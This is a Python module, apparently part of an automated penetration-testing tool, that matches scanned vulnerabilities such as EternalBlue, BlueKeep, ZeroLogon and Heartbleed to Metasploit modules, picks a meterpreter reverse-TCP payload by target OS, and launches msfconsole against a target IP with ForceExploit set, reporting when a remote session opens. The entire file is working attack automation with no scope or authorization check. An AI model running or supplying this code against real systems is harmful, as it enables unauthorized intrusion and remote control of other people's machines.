import subprocess
import logging
from typing import Dict, Optional

from utils import WHITE, RESET

class ExploitRunner:
    def __init__(self):
        self.tool_paths = {"msfconsole": "msfconsole"}
        # Expanded mapping of vulnerabilities to Metasploit modules
        self.vuln_to_exploit = {
            "CVE-2017-0144": "exploit/windows/smb/ms17_010_eternalblue",  # EternalBlue (SMB)
            "CVE-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",  # BlueKeep (RDP)
            "CVE-2021-22986": "exploit/http/f5_bigip_rce",  # F5 BIG-IP RCE
            "CVE-2014-0160": "auxiliary/scanner/ssl/openssl_heartbleed",  # Heartbleed
            "VULNERABLE (SSH)": "auxiliary/scanner/ssh/ssh_login",  # SSH brute force
            "VULNERABLE (FTP)": "auxiliary/scanner/ftp/ftp_login",  # FTP brute force
            "CVE-2020-1472": "exploit/windows/dcerpc/cve_2020_1472_zerologon"  # ZeroLogon
        }
        # Common payloads for reverse shells
        self.payloads = {
            "windows": "windows/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp",
            "generic": "generic/shell_reverse_tcp"
        }

    def suggest_exploit(self, vuln: Dict[str, str]) -> Optional[str]:
        """Suggest a Metasploit exploit module based on vulnerability data."""
        cve = vuln.get("cve")
        if cve and cve in self.vuln_to_exploit:
            return self.vuln_to_exploit[cve]
        description = vuln.get("description", "").upper()
        service = vuln.get("service", "").upper()
        for keyword, module in self.vuln_to_exploit.items():
            if keyword in description or keyword in service:
                return module
        return None

    def suggest_payload(self, vuln: Dict[str, str]) -> str:
        """Suggest a payload based on the target service or OS."""
        service = vuln.get("service", "").lower()
        version = vuln.get("version", "").lower()
        if "windows" in version:
            return self.payloads["windows"]
        elif "linux" in version or "unix" in version:
            return self.payloads["linux"]
        elif "ssh" in service:
            return self.payloads["generic"]
        return self.payloads["generic"]

    def run_exploit(self, target_ip: str, exploit_module: str, vuln: Dict[str, str], lhost: str, lport: int) -> None:
        """Run a Metasploit exploit against the target with a payload."""
        payload = self.suggest_payload(vuln)
        msf_cmd = [self.tool_paths["msfconsole"], "-q", "-x"]
        options = (
            f"use {exploit_module};"
            f"set RHOSTS {target_ip};"
            f"set RPORT {vuln['port']};"
            f"set PAYLOAD {payload};"
            f"set LHOST {lhost};"
            f"set LPORT {lport};"
            f"set ForceExploit true;"
            "exploit;"
            "exit"
        )
        msf_cmd.append(options)
        
        logging.info(f"Executing exploit {exploit_module} with payload {payload} on {target_ip}:{vuln['port']}")
        print(WHITE + f"Launching {exploit_module} with {payload} against {target_ip}:{vuln['port']}..." + RESET)
        try:
            result = subprocess.run(msf_cmd, capture_output=True, text=True, timeout=900)
            print(WHITE + f"Exploit output:\n{result.stdout}" + RESET)
            if "Meterpreter session" in result.stdout:
                print(WHITE + "Success! Meterpreter session opened. Check your Metasploit console." + RESET)
            elif result.stderr:
                print(WHITE + f"Errors:\n{result.stderr}" + RESET)
        except subprocess.TimeoutExpired:
            print(WHITE + "Exploit timed out after 15 minutes." + RESET)
        except Exception as e:
            logging.error(f"Exploit failed: {str(e)}")
            print(WHITE + f"Exploit failed: {str(e)}" + RESET)